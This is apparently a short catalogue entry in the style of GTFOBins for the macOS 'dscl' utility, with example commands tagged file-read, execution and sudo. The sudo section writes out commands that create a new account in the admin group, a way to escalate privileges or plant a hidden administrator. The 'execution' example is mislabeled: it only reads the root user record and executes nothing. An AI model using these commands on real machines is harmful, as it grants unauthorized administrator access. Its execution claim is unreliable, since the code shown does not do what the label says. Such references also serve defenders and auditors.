---
title: dscl
tags: [file-read, execution, sudo]
description: Directory Service command line utility for managing user accounts and system configuration.
file-read: |
  # Read user information
  dscl . -read /Users/username
  
  # List all users
  dscl . -list /Users
  
  # Read system configuration
  dscl . -read /Config
execution: |
  # Execute commands via dscl (if misconfigured)
  dscl localhost -read /Local/Default/Users/root
sudo: |
  # Potential privilege escalation if user has dscl sudo rights
  sudo dscl . -create /Users/newadmin
  sudo dscl . -create /Users/newadmin UserShell /bin/bash
  sudo dscl . -create /Users/newadmin RealName "Admin User"
  sudo dscl . -create /Users/newadmin PrimaryGroupID 80
  sudo dscl . -create /Users/newadmin NFSHomeDirectory /Users/newadmin
layout: binary
---
